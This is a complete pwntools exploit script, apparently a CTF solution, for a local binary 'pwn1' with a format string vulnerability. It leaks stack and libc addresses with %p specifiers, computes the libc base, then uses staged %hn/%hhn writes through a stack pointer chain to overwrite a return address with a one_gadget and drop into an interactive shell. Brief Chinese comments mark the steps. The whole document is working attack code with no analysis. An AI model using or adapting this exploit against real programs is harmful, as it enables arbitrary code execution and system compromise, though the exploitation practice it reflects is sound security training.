from pwn import *
from LibcSearcher import *
context.terminal=['tmux','splitw','-h']
context(os='linux', arch='amd64', kernel='amd64',log_level='debug')
#context(os='linux', arch='i386', kernel='i386',log_level='debug')
#io=gdb.debug('./pwn')
io=process('./pwn1')
libc=ELF('./libc-2.23_sym.so')
elf=ELF('./pwn1')
#io=remote('node4.buuoj.cn',)
s,sl,sa,sla = io.send, io.sendline, io.sendafter, io.sendlineafter
r, ra, rl, ru = io.recv, io.recvall, io.recvline, io.recvuntil
ii=io.interactive
def lg(var):
    for name, value in globals().items():
        if value is var:
            log.info(f"{name} => {hex(var)}")
            return
def fl():
    ru(b'flag')

gdb.attach(io,'''
b *0x000000004007A1
b *0x0000040077A
''')
pause()


ru(b'>>> ')

#1泄露栈地址和libc地址
payload1=b'stack%8$plibc%11$p'
oneget=0x45226
sl(payload1)
ru(b'stack0x')
#rbp= int(io.recv(12).rjust(16,b'0'),16)
stack= int(r(12),16)
lg(stack)
ru(b'libc0x')
libc=int(r(12),16)
lg(libc)
libcbase=libc-0x20840

lg(libcbase)

oneget=libcbase+oneget
lg(oneget)
main_zhandizhi=stack+0x8
lg(main_zhandizhi)
#sanji=stack+
#%13$p sanji
#更改三级指针
word=main_zhandizhi&0xffff
lg(word)
payload2=f'%{word}c%13$hnflag'

payload2=payload2.encode()
sl(payload2)
fl()
#%39$p

word=oneget&0xffff
payload3=f'%{word}c%39$hnflag'

payload3=payload3.encode()
sl(payload3)

fl()




word=(main_zhandizhi+2)&0xffff
lg(word)
payload4=f'%{word}c%13$hnflag'

payload4=payload4.encode()
sl(payload4)
fl()



lg(oneget)
word=oneget&0xffffff
lg(word)
word=word>>16
lg(word)
payload5=f'%{word}c%39$hhnflag'

payload5=payload5.encode()
sl(payload5)

fl()

sl(b'q')

ii()
